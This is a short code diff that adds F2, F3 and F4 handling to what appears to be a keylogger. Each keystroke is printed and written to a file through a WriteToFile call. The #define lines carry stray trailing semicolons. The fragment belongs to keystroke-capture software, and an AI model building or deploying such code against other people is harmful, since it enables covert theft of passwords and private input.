@@ -43,6 +43,9 @@
 #define VK_NUMPAD8 0x68;
 #define VK_NUMPAD9 0x69;
 #define VK_RWIN 0x5C;
+#define VK_F2 0x71;
+#define VK_F3 0x72;
+#define VK_F4 0x73;
 
 
 
@@ -324,6 +327,21 @@ bool Key_is_Listed(WORD iKey)
 		break;
 
 
+
+	case 0x71:
+		std::cout << "  *F2*  ";
+		WriteToFile("  *F2*  ");
+		break;
+
+	case 0x72:
+		std::cout << "  *F3*  ";
+		WriteToFile("  *F3*  ");
+		break;
+
+	case 0x73:
+		std::cout << "  *F4*  ";
+		WriteToFile("  *F4*  ");
+		break;
 
 	case 0x5C:
 		std::cout << "  *Right_Windows*  ";
